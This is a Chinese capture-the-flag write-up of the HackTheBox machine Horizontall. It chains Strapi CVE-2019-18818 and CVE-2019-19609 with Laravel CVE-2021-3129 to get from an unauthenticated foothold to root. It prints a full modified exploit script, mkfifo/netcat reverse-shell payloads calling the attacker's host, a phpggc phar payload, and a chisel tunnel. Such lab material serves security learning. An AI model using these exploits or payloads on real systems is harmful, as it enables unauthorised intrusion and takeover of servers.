# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测

```
┌──(root💀kali)-[~]
└─# nmap -sV -Pn 10.10.11.105                         
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 08:48 EST
Nmap scan report for 10.10.11.105
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

手机访问80端口，跳转到了一个叫```horizontall.htb```的域名

我们先把这个域名添加到```/etc/hosts```

> echo "10.10.11.105 horizontall.htb" >> /etc/hosts

## 爆破目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://horizontall.htb/                                                                               

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/horizontall.htb/-_21-12-02_09-01-00.txt

Error Log: /root/dirsearch/logs/errors-21-12-02_09-01-00.log

Target: http://horizontall.htb/

[09:01:01] Starting: 
[09:01:10] 301 -  194B  - /js  ->  http://horizontall.htb/js/              
[09:01:11] 400 -  182B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[09:01:56] 400 -  182B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[09:02:01] 301 -  194B  - /css  ->  http://horizontall.htb/css/             
[09:02:06] 200 -    4KB - /favicon.ico                                      
[09:02:11] 301 -  194B  - /img  ->  http://horizontall.htb/img/             
[09:02:15] 403 -  580B  - /js/                                              
[09:02:17] 200 -  901B  - /index.html    
```

只有几个文件夹，没啥有用的发现

## vhost爆破

这里我卡了很久，找不到任何有用的东西，后来上论坛看hint，有人留言说二级域名可能有点东西

尝试爆破vhost，我们使用gobuster 

先把[这个字典](https://github.com/danielmiessler/SecLists)下载到本地



```
┌──(root💀kali)-[~/htb/Horizontall]
└─# gobuster vhost -u horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://horizontall.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/12/02 23:28:43 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
                                                         
===============================================================
2021/12/02 23:35:06 Finished
===============================================================

```

找到一个可以利用的二级域名：```api-prod.horizontall.htb```

再次编辑```/etc/hosts```

把```10.10.11.105 horizontall.htb```替换成```10.10.11.105 api-prod.horizontall.htb```

现在我们可以在浏览器打开```api-prod.horizontall.htb```了

## 爆破二级域名
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://api-prod.horizontall.htb/ 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/api-prod.horizontall.htb/-_21-12-03_00-35-14.txt

Error Log: /root/dirsearch/logs/errors-21-12-03_00-35-14.log

Target: http://api-prod.horizontall.htb/

[00:35:15] Starting: 
[00:35:24] 400 -  182B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[00:35:35] 200 -  854B  - /ADMIN                                            
[00:35:35] 200 -  854B  - /Admin/login/                                     
[00:35:35] 200 -  854B  - /Admin                                            
[00:35:40] 400 -   67B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[00:35:45] 200 -  854B  - /admin                                            
[00:35:47] 200 -  854B  - /admin/_logs/access_log                           
[00:35:47] 200 -  854B  - /admin/.config                                    
[00:35:47] 200 -  854B  - /admin/.htaccess                                  
[00:35:47] 200 -  854B  - /admin/?/login
[00:35:47] 200 -  854B  - /admin/                                           
[00:35:47] 200 -  854B  - /admin/_logs/error-log
[00:35:47] 200 -  854B  - /admin/access_log                                 
[00:35:47] 200 -  854B  - /admin/admin-login                                
[00:35:47] 200 -  854B  - /admin/_logs/access-log
[00:35:47] 200 -  854B  - /admin/admin                                      
[00:35:47] 200 -  854B  - /admin/_logs/error_log
[00:35:47] 200 -  854B  - /admin/admin/login                                
[00:35:47] 200 -  854B  - /admin/adminLogin                                 
[00:35:47] 200 -  854B  - /admin/backup/                                    
[00:35:48] 200 -  854B  - /admin/backups/                                   
[00:35:48] 200 -  854B  - /admin/controlpanel                               
[00:35:48] 200 -  854B  - /admin/db/                                        
[00:35:48] 200 -  854B  - /admin/error_log
[00:35:48] 200 -  854B  - /admin/default
[00:35:48] 200 -  854B  - /admin/FCKeditor                                  
[00:35:48] 200 -  854B  - /admin/home                                       
[00:35:48] 200 -  854B  - /admin/index                                      
[00:35:48] 200 -  854B  - /admin/index.html                                 
[00:35:48] 200 -  854B  - /admin/js/tiny_mce                                
[00:35:48] 200 -  854B  - /admin/login                                      
[00:35:48] 200 -  854B  - /admin/js/tiny_mce/
[00:35:48] 200 -  854B  - /admin/js/tinymce/                                
[00:35:48] 200 -  854B  - /admin/js/tinymce                                 
[00:35:48] 200 -  854B  - /admin/cp                                         
[00:35:48] 200 -  854B  - /admin/account                                    
[00:35:48] 200 -  854B  - /admin/dumper/                                    
[00:35:48] 200 -  854B  - /admin/log                                        
[00:35:48] 200 -  854B  - /admin/logs/                                      
[00:35:48] 200 -  854B  - /admin/logs/error_log                             
[00:35:48] 200 -  854B  - /admin/logs/access_log                            
[00:35:48] 200 -  854B  - /admin/mysql/                                     
[00:35:48] 200 -  854B  - /admin/logs/access-log                            
[00:35:48] 200 -  854B  - /admin/phpMyAdmin                                 
[00:35:48] 200 -  854B  - /admin/logs/error-log
[00:35:48] 200 -  854B  - /admin/admin_login                                
[00:35:48] 200 -  854B  - /admin/phpMyAdmin/                                
[00:35:48] 200 -  854B  - /admin/manage                                     
[00:35:48] 200 -  854B  - /admin/pMA/
[00:35:48] 200 -  854B  - /admin/pma/                                       
[00:35:48] 200 -  854B  - /admin/portalcollect.php?f=http://xxx&t=js
[00:35:48] 200 -  854B  - /admin/phpmyadmin/
[00:35:48] 200 -  854B  - /admin/scripts/fckeditor
[00:35:48] 200 -  854B  - /admin/release
[00:35:48] 200 -  854B  - /admin/sysadmin/                                  
[00:35:48] 200 -  854B  - /admin/private/logs
[00:35:48] 200 -  854B  - /admin/sqladmin/                                  
[00:35:48] 200 -  854B  - /admin/sxd/
[00:35:48] 200 -  854B  - /admin/signin                                     
[00:35:48] 200 -  854B  - /admin/tinymce
[00:35:48] 200 -  854B  - /admin/tiny_mce                                   
[00:35:49] 200 -  854B  - /admin/web/                                       
[00:36:20] 400 -  182B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[00:36:38] 200 -    1KB - /favicon.ico                                      
[00:36:46] 200 -  413B  - /index.html                                       
[00:37:17] 200 -  507B  - /reviews                                          
[00:37:17] 200 -  121B  - /robots.txt     
```

有一个admin的后台
查看网页源代码，发现这个后台是由一个叫```Strapi```的cms做的

## CVE-2019-18818
我们在谷歌搜索这个cms的漏洞利用脚本，选择[这个exp](https://www.exploit-db.com/exploits/50239)

下载到本地以后执行攻击
```
┌──(root💀kali)-[~/htb/Horizontall]
└─# python3 exp.py http://api-prod.horizontall.htb/                                                                        
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NzY5NTcyLCJleHAiOjE2NDEzNjE1NzJ9.4rETx89O06Mqa1fWj4uwUVhqK9krXg6dP4BzfudH4mI
```
此时我们有了一个cms的登录凭证：```admin:SuperStrongPassword1```

同时记住这个token：```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NzY5NTcyLCJleHAiOjE2NDEzNjE1NzJ9.4rETx89O06Mqa1fWj4uwUVhqK9krXg6dP4BzfudH4mI```

## CVE-2019-19609
登录进入后台以后，我们在仪表盘发现cms的版本号是：```Strapi v3.0.0-beta.17.4```

根据这个版本号。在谷歌上搜索可以利用的exp，我们找到[这个攻击脚本](https://www.exploit-db.com/exploits/50238)

下载到本地

执行下面payload


> python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NzY5NTcyLCJleHAiOjE2NDEzNjE1NzJ9.4rETx89O06Mqa1fWj4uwUVhqK9krXg6dP4BzfudH4mI" "id" "10.10.14.16" 


```
┌──(root💀kali)-[~/htb/Horizontall]
└─# python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NzY5NTcyLCJleHAiOjE2NDEzNjE1NzJ9.4rETx89O06Mqa1fWj4uwUVhqK9krXg6dP4BzfudH4mI" "id" "10.10.14.16"

=====================================
CVE-2019-19609 - Strapi RCE
-------------------------------------
@David_Uton (M3n0sD0n4ld)
https://m3n0sd0n4ld.github.io/
=====================================

[+] Successful operation!!!
listening on [any] 9999 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.105] 45258
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}

```

第三个参数可以执行一条命令，由上可见当前webshell用户是```strapi```


但是这个shell每次只能执行一条命令，不好用。

现在我们知道exp是可以执行系统命令的，现在我们直接修改exp为一个反弹shell
```
# Exploit Title: Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 29/08/2021
# Exploit Author: David Utón (M3n0sD0n4ld)
# Vendor Homepage: https://strapi.io/
# Affected Version: strapi-3.0.0-beta.17.7 and earlier
# Tested on: Linux Ubuntu 18.04.5 LTS
# CVE : CVE-2019-19609

#!/usr/bin/python3
# Author: @David_Uton (m3n0sd0n4ld)
# Github: https://m3n0sd0n4ld.github.io
# Usage: python3 CVE-2019-19609.py http[s]//IP[:PORT] TOKEN_JWT COMMAND LHOST

import requests, sys, os, socket

logoType = ('''
=====================================
CVE-2019-19609 - Strapi RCE
-------------------------------------
@David_Uton (M3n0sD0n4ld)
https://m3n0sd0n4ld.github.io/
=====================================
		''')

if __name__ == '__main__':

	# Parameter checking
	if len(sys.argv) != 5:
		print(logoType)
		print("[!] Some of these parameters are missing.")
		print('''
		Use: python3 %s http[s]//IP[:PORT] TOKEN_JWT COMMAND LHOST
		Example: python3 10.10.10.10 eyJHbGCi..... "id" 127.0.0.1''' % sys.argv[0])
	# Exploit run
	else:
		# Paremeters
		url = sys.argv[1]
		token = sys.argv[2]
		command = sys.argv[3]
		lhost = sys.argv[4]
		lport = 9999
		
		s = requests.session()
		
		r = s.post(url, verify=False) # SSL == verify=True
		
		headersData = {
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
			'Authorization': "Bearer %s" % token
		}

		postData = {
			"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4242 >/tmp/f)" 
		}
		
		print(logoType)
		os.system("nc -nvlp 9999 &")
		try:
			print("[+] Successful operation!!!")
			r = s.post(url + "/admin/plugins/install", headers=headersData, data=postData, verify=False) # SSL == verify=True
			# Content print
			print(r.text)
		except:
			print("[!] An error occurred, try again.")
			sys.exit(1)

```

把postData里面的值从
> "plugin":"documentation && $(%s > /tmp/.m3 && nc %s %s < /tmp/.m3 | rm /tmp/.m3)" % (command, lhost, lport)

改成：
> "plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4242 >/tmp/f)" 

保存。

开启监听，执行攻击。

收到反弹的完整shell
```
─# nc -lnvp 4242               
listening on [any] 4242 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.105] 58760
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
$ whoami
strapi

```
# 提权
查看所有tcp连接
```
netstat -nap|grep tcp
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1845/node /usr/bin/ 
tcp        0     23 10.10.11.105:35982      10.10.14.16:4242        ESTABLISHED 2825/nc             
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -     
```

查看所有进程
```
ps -aux |more
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
strapi     1798  0.0  0.3  76648  7324 ?        Ss   05:40   0:00 /lib/systemd/systemd --user
strapi     1834  0.0  2.0 610056 40608 ?        Ssl  05:40   0:00 PM2 v4.5.6: God Daemon (/opt/strapi/.pm2)
strapi     1845  0.4  3.5 910600 72176 ?        Ssl  05:40   0:03 node /usr/bin/strapi
strapi     2801  0.2  2.0 804984 40656 ?        Sl   05:50   0:00 npm
strapi     2819  0.0  0.0   4640   932 ?        S    05:50   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4242 >/tmp/f)"
strapi     2820  0.0  0.0   4640   104 ?        S    05:50   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4242 >/tmp/f)"
strapi     2823  0.0  0.0   6328   748 ?        S    05:50   0:00 cat /tmp/f
strapi     2824  0.0  0.0   4640   816 ?        S    05:50   0:00 /bin/sh -i
strapi     2825  0.0  0.1  15724  2184 ?        S    05:50   0:00 nc 10.10.14.16 4242
strapi     2844  0.0  0.4  38980  9768 ?        S    05:51   0:00 python3 -c __import__('pty').spawn('/bin/bash')
strapi     2845  0.0  0.2  21364  5152 pts/0    Ss   05:51   0:00 /bin/bash
strapi     2930  0.0  0.1  38384  3508 pts/0    R+   05:53   0:00 ps -aux
strapi     2931  0.0  0.0   8424   932 pts/0    S+   05:53   0:00 more
```

根据进程和本地连接显示，有3个进程是只允许127.0.0.1本地监听的
3306是数据库，这个正常
1337是我们进来时候是strapi，我们从外网通过二级域名也可以访问
剩下的8000端口不知道是什么服务，我们用隧道连接看看


## chisel隧道连接
kali端
```
┌──(root💀kali)-[~/chisel]
└─# ./chisel server -p 8888 --reverse
2021/12/06 01:19:43 server: Reverse tunnelling enabled
2021/12/06 01:19:43 server: Fingerprint RrZsQFbor2kqfDlA6y9yeOs9BiezohKLhkENPxg4P9A=
2021/12/06 01:19:43 server: Listening on http://0.0.0.0:8000
2021/12/06 01:20:59 server: session#1: tun: proxy#R:1337=>localhost:1337: Listening

```
靶机端
```
strapi@horizontall:/tmp$ ./chisel client 10.10.14.16:8888 R:8000:localhost:8000
<hisel client 10.10.14.16:8000 R:1337:localhost:1337
2021/12/06 06:22:21 client: Connecting to ws://10.10.14.16:8000
2021/12/06 06:22:24 client: Connected (Latency 386.283845ms)

```
现在我们本地已经监听到这个端口的服务了
```
┌──(root💀kali)-[~]
└─# netstat -ano |grep 8000
tcp6       0      0 :::8000                 :::*                    LISTEN      off (0.00/0/0)

```



浏览器打开```localhost：8000```是一个Laravel的展示页，显示版本是```Laravel v8 (PHP v7.4.18) ```


爆破这个站点，看看有什么文件和目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://localhost:8000                                                               

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/localhost-8000/_21-12-06_01-38-51.txt

Error Log: /root/dirsearch/logs/errors-21-12-06_01-38-51.log

Target: http://localhost:8000/

[01:38:52] Starting: 
[01:39:14] 200 -  603B  - /.htaccess                                       
[01:39:14] 200 -   17KB - /.htaccess/                                      
[01:39:48] 405 -  547KB - /_ignition/execute-solution                       
[01:40:51] 200 -    1KB - /web.config  
```
## CVE-2021-3129
查看```/_ignition/execute-solution ```目录，结合页面信息谷歌搜索有可能存在```CVE-2021-3129```

我在github上找到了[这个exp](https://github.com/ambionics/laravel-exploits)

根据exp的攻击步骤，首先要在kali上安装phpggc

> sudo apt install phpggc

把执行命令```id```编译到```/tmp/exploit.phar```文件

```
┌──(root💀kali)-[~/htb/Horizontall/phpggc]
└─# php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id

```


查看tmp文件夹下已经生成了一个phar文件
```
┌──(root💀kali)-[~/htb/Horizontall/phpggc]
└─# ll /tmp/exploit.phar 
-rw-r--r-- 1 root root 514 12月  6 02:33 /tmp/exploit.phar

```


执行攻击：

```
┌──(root💀kali)-[~/htb/Horizontall]
└─# python3 exp3.py  http://localhost:8000/ /tmp/exploit.phar                                                                                                                                                                           1 ⨯
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared

```

成功回显命令，发现是root权限


上面已经证明漏洞存在，可以执行任意命令，编译反弹shell
```
┌──(root💀kali)-[~/htb/Horizontall/phpggc]
└─# php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4444 >/tmp/f'

```

开启一个监听
> nc -lnvp 4444  

再次执行攻击，收到root的反弹shell

```
┌──(root💀kali)-[~]
└─# nc -lnvp 4444                                                                                                                                                                                                                       1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.105] 60848
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root

```

# 总结
这是我第一次打HTB现役的机器，断断续续还花了挺长时间，vhost和隧道那里是很关键的两步，不然没法做下去，我自己也是看了论坛上作者的hint才想到。。
吃过的亏都是经验，继续努力。
